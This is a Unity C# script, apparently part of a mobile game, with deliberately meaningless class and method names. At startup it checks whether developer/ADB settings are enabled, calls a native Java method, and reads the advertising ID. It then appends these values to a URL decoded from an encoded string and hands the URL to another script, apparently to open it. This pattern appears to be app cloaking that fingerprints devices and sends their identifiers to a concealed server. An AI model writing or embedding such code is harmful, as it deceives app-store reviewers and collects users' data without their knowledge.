using System.Collections;
using UnityEngine;

public class Script8 : MonoBehaviour
{
    public static Script8 Mains;
    void multiPoko()
    {
        if (Mains == null)
        {
            DontDestroyOnLoad(gameObject);
            Mains = this;
        }
        else if (Mains != this)
        {
            Destroy(gameObject);
        }
    }
    private void Awake()
    {
        multiPoko();
    }
    private void Start()
    {
        StartCoroutine(Wait());
    }
    public IEnumerator Wait()
    {
        if (MainScriptForGame.Mains.saveLinka == "")
        {
            if (Script2.Mains.GetDevelopmentSettingsStatus() == 0)
            {
                MainScriptForGame.Mains.ADB = "false";
            }
            else
            {
                MainScriptForGame.Mains.ADB = "true";
            }

            try
            {
                MainScriptForGame.Mains.TMZ = CaptiveReality.Jni.Util.StaticCall<string>("sayHello", "ERROR", "com.first.texturehelper.HelloWorld");

            }
            catch
            {

            }
            

     //       yield return new WaitUntil(() => MainScriptForGame.Mains.STR != "null" || MainScriptForGame.Mains.value[5] != "null");
            for (int i=0; MainScriptForGame.Mains.STR != "null" && MainScriptForGame.Mains.value[5] != "null" && i <7; i++)
            {
                yield return new WaitForSeconds(1);
            }


            yield return new WaitForEndOfFrame();

            for (int waitTime = 0; waitTime <= 10; waitTime++)
            {
                if (MainScriptForGame.Mains.ready[1] == true && MainScriptForGame.Mains.ready[2] == true)
                {
                    break;
                }
                yield return new WaitForSeconds(1f);
            }
            yield return new WaitForSeconds(0.5f);
            string main = Script7.Mains.dec(MainScriptForGame.Mains.s64) + "?" + MainScriptForGame.Mains.par[0] + "=" + MainScriptForGame.Mains.par[1] + "&" + MainScriptForGame.Mains.par[2] + "=" + MainScriptForGame.Mains.TMZ + "&" + MainScriptForGame.Mains.par[3] + "=" + MainScriptForGame.Mains.ADB + "&" + MainScriptForGame.Mains.par[4] + "=" + MainScriptForGame.Mains.gaid;
            if (MainScriptForGame.Mains.STR == "")
            {
                main += "&" + MainScriptForGame.Mains.par[5] + "=null";
            }
            else
            {
                main += "&" + MainScriptForGame.Mains.par[5] + "=" + MainScriptForGame.Mains.STR;
            }
            for (int i = 6; i < MainScriptForGame.Mains.par.Length; i++)
            {
                if (MainScriptForGame.Mains.value[i - 6] != "")
                {
                    main += "&" + MainScriptForGame.Mains.par[i] + "=" + MainScriptForGame.Mains.value[i - 6];
                }
                else
                {
                    MainScriptForGame.Mains.value[i - 6] = "null";
                    main += "&" + MainScriptForGame.Mains.par[i] + "=" + MainScriptForGame.Mains.value[i - 6];
                }
            }

            StartCoroutine(Script6.Mains.Sus(main));
        }

        else if (MainScriptForGame.Mains.saveLinka == "http://localhost/")
        {
            yield break;
        }
        else
        {
            StartCoroutine(Script6.Mains.Sus(MainScriptForGame.Mains.saveLinka));
        }
    }

}
